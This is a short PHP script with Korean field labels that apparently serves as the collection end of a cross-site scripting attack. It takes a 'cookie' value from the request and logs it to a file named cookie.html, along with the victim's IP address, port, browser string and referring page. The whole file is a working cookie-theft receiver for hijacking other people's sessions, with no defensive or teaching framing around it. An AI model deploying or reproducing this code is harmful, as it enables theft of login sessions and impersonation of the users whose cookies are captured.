<?
        $log_time = date("Y/m/d(H:i:s)", time());
        $logname = date('Ymd');
        $fp = fopen("cookie.html","a+");
		$REMOTE_ADDR=$_SERVER['REMOTE_ADDR'];
		$REMOTE_PORT=$_SERVER['REMOTE_PORT'];
		$HTTP_USER_AGENT=$_SERVER['HTTP_USER_AGENT'];		
		$HTTP_REFERER=$_SERVER['HTTP_REFERER'];
        $cookie = $_GET['cookie'];
        fwrite($fp,"
                <table width='100%' height='22%' border='1' cellpadding='5'>
  <tr>
    <td width='8%' height='27%' align='right'>시간 : </td>
    <td width='55%'> $log_time </td>
    <td width='6%' align='right'>아이피  : </td>
    <td width='31%'>$REMOTE_ADDR:$REMOTE_PORT</td>
  </tr>
  <tr>
    <td height='27%' align='right'>브라우저 : </td>
    <td colspan='3'>$HTTP_USER_AGENT</td>
  </tr>
  <tr>
    <td height='27%' align='right'>이전주소 : </td>
    <td colspan='3'><a href='$HTTP_REFERER'>$HTTP_REFERER</td>
  </tr>
  <tr>
    <td height='19%' align='right'>쿠키 : </td>
    <td style='word-break:break-all;' colspan='3'>$cookie</td>
  </tr>
</table>
                ");
        fclose($fp);
?>
